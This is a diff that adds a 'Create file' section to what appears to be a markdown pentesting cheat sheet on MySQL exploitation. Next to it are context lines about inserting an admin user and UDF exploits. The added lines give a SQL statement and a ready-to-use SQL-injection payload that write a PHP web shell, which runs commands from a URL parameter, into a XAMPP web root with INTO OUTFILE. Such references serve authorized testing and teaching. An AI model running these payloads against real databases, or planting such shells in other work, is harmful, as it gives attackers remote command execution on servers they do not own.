@@ -141,6 +141,16 @@ INSERT INTO table_name (column1, column2, column3, ...) VALUES (value1, value2, 
 INSERT INTO users (username, password) VALUES ("new_admin", "5F4DCC3B5AA765D61D8327DEB882CF99"); 
 ```
 
+Create file:
+
+```bash
+# basic syntax
+SELECT ("<?php echo passthru($_GET['cmd']);") INTO OUTFILE 'C:/xampp/htdocs/cmd.php'
+
+# sqli
+' UNION SELECT ("<?php echo passthru($_GET['cmd']);") INTO OUTFILE 'C:/xampp/htdocs/cmd.php'  -- -'
+```
+
 ## MySQL Common Exploit - User-Defined Function (UDF)
 
 * MySQL 4.x/5.0 (Linux) - User-Defined Function (UDF) Dynamic Library (2)
